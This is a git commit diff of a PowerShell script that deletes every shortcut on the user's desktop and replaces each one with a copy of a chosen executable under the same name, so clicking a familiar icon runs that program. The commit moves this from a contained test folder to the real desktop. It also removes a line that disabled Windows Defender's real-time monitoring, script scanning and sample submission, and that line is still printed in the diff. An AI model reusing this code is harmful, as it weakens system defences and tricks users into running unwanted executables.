f89a5f46f40ef353f674c63b1eabb7a9d4eb4f96
the8bitbyte <133459899+the8bitbyte@users.noreply.github.com>
2023-12-20 19:29:53 -0500

    Update ps1fr.ps1

--- ps1fr.ps1
+++ ps1fr.ps1
@@ -1,8 +1,3 @@
-# Run a command
-Write-Host "Shutting of windows defender..."
-Invoke-Expression "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
-
-
 # Check if ps1prep.txt exists on the desktop
 $ps1prepPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'ps1prep.txt')
 if (-not (Test-Path $ps1prepPath)) {
@@ -18,7 +13,6 @@ if (-not (Test-Path $ps1prepPath)) {
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'ps1ran.txt')
 Set-Content -Path $desktopPath -Value "This is the ps1 ran file."
 
-
 # Read the file path from ps1prep.txt
 $executablePath = Get-Content $ps1prepPath -Raw
 
@@ -30,22 +24,11 @@ Copy-Item -Path $executablePath -Destination $duplicatedPath -Force
 
 Write-Host "Executable duplicated to: $duplicatedPath" -ForegroundColor Yellow
 
-# Get the file path from ps1prep.txt
-$ps1PrepFilePath = "C:\Users\jaysc\Desktop\ps1prep.txt"
-$shortcutSourcePath = Get-Content -Path $ps1PrepFilePath
-
 # Validate that the file path exists
-if (Test-Path $shortcutSourcePath -PathType Leaf) {
-    # Specify the folder on the desktop
-    $desktopFolderPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "containedTesting Folder")
-
-    # Create the folder if it doesn't exist
-    if (-not (Test-Path $desktopFolderPath -PathType Container)) {
-        New-Item -ItemType Directory -Path $desktopFolderPath | Out-Null
-    }
-
-    # Scan the folder for shortcuts
-    $shortcuts = Get-ChildItem -Path $desktopFolderPath -Filter *.lnk
+if (Test-Path $executablePath -PathType Leaf) {
+    # Scan the desktop for shortcuts
+    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'))
+    $shortcuts = Get-ChildItem -Path $desktopPath -Filter *.lnk
 
     # Process each shortcut
     foreach ($shortcut in $shortcuts) {
@@ -55,14 +38,12 @@ if (Test-Path $shortcutSourcePath -PathType Leaf) {
         # Delete the existing shortcut
         Remove-Item $shortcut.FullName -Force
 
-        # Create a copy of the executable and place it in the folder
-        $executableCopyPath = [System.IO.Path]::Combine($desktopFolderPath, "$shortcutName.exe")
-        Copy-Item -Path $shortcutSourcePath -Destination $executableCopyPath -Force
+        # Create a copy of the executable and place it on the desktop
+        $executableCopyPath = [System.IO.Path]::Combine($desktopPath, "$shortcutName.exe")
+        Copy-Item -Path $executablePath -Destination $executableCopyPath -Force
     }
 
     Write-Host "Script completed successfully."
-   
-
 } else {
     Write-Host "Error: The specified file path in ps1prep.txt does not exist."
 }
